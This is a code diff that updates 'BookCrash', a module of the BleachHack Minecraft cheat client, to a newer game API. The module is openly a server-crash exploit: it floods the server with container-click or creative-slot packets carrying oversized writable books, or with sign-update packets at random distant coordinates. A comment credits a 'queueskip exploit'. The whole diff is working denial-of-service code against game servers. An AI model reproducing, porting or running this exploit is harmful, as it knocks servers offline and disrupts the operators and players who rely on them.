@@ -8,6 +8,8 @@
  */
 package org.bleachhack.module.mods;
 
+import java.util.ArrayList;
+import java.util.List;
 import java.util.Random;
 import java.util.stream.Collectors;
 import java.util.stream.IntStream;
@@ -23,16 +25,18 @@ import org.bleachhack.setting.module.SettingToggle;
 
 import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
 import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
+import net.minecraft.core.component.DataComponents;
+import net.minecraft.network.HashedPatchMap;
+import net.minecraft.network.HashedStack;
+import net.minecraft.server.network.Filterable;
 import net.minecraft.world.item.ItemStack;
 import net.minecraft.world.item.Items;
-import net.minecraft.nbt.CompoundTag;
-import net.minecraft.nbt.ListTag;
-import net.minecraft.nbt.StringTag;
+import net.minecraft.world.item.component.WritableBookContent;
 import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
 import net.minecraft.network.protocol.game.ServerboundSetCreativeModeSlotPacket;
 import net.minecraft.network.protocol.game.ServerboundSignUpdatePacket;
 import net.minecraft.network.protocol.common.ClientboundDisconnectPacket;
-import net.minecraft.world.inventory.ClickType;
+import net.minecraft.world.inventory.ContainerInput;
 import net.minecraft.core.BlockPos;
 
 /* Rebranded queueskip exploit. credit > https://www.youtube.com/watch?v=-BA4ABlFJuc */
@@ -57,10 +61,6 @@ public class BookCrash extends Module {
 			return;
 
 		ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
-		ListTag list = new ListTag();
-		CompoundTag tag = new CompoundTag();
-		String author = "Bleach";
-		String title = "\n Bleachhack Owns All \n";
 
 		String size = "";
 		int pages = Math.min(getSetting(4).asSlider().getValueInt(), 100);
@@ -82,30 +82,28 @@ public class BookCrash extends Module {
 			String text = "bh ontop";
 			Random rand = new Random();
 			for (int i = 0; i < getSetting(1).asSlider().getValue(); i++) {
-				mc.player.networkHandler.sendPacket(new ServerboundSignUpdatePacket(
-						new BlockPos(rand.nextInt(29999999), rand.nextInt(29999999), rand.nextInt(29999999)),true, text, text, text, text));
+				mc.player.connection.send(new ServerboundSignUpdatePacket(
+						new BlockPos(rand.nextInt(29999999), rand.nextInt(29999999), rand.nextInt(29999999)), true, text, text, text, text));
 			}
 		} else {
+			// 26.2: books use the WRITABLE_BOOK_CONTENT data component instead of raw NBT.
+			List<Filterable<String>> pageList = new ArrayList<>();
 			for (int i = 0; i < pages; i++) {
-				StringTag tString = StringTag.of(size);
-				list.add(tString);
+				pageList.add(Filterable.passThrough(size));
 			}
+			bookObj.set(DataComponents.WRITABLE_BOOK_CONTENT, new WritableBookContent(pageList));
 
-			tag.putString("author", author);
-			tag.putString("title", title);
-			tag.put("pages", list);
-
-			bookObj.setSubNbt("pages", list);
-			bookObj.setNbt(tag);
+			HashedPatchMap.HashGenerator hasher = mc.player.connection.decoratedHashOpsGenenerator();
 
 			for (int i = 0; i < getSetting(1).asSlider().getValue(); i++) {
 				if (getSetting(0).asMode().getMode() == 0) {
-					Int2ObjectMap<ItemStack> map = new Int2ObjectOpenHashMap<>(1);
-					map.put(0, bookObj);
+					Int2ObjectMap<HashedStack> map = new Int2ObjectOpenHashMap<>(1);
+					map.put(0, HashedStack.create(bookObj, hasher));
 
-					mc.player.networkHandler.sendPacket(new ServerboundContainerClickPacket(0, 0, 0, 0, ClickType.PICKUP, bookObj, map));
+					mc.player.connection.send(new ServerboundContainerClickPacket(
+							0, 0, (short) 0, (byte) 0, ContainerInput.PICKUP, map, HashedStack.create(bookObj, hasher)));
 				} else {
-					mc.player.networkHandler.sendPacket(new ServerboundSetCreativeModeSlotPacket(0, bookObj));
+					mc.player.connection.send(new ServerboundSetCreativeModeSlotPacket(0, bookObj));
 				}
 			}
 		}
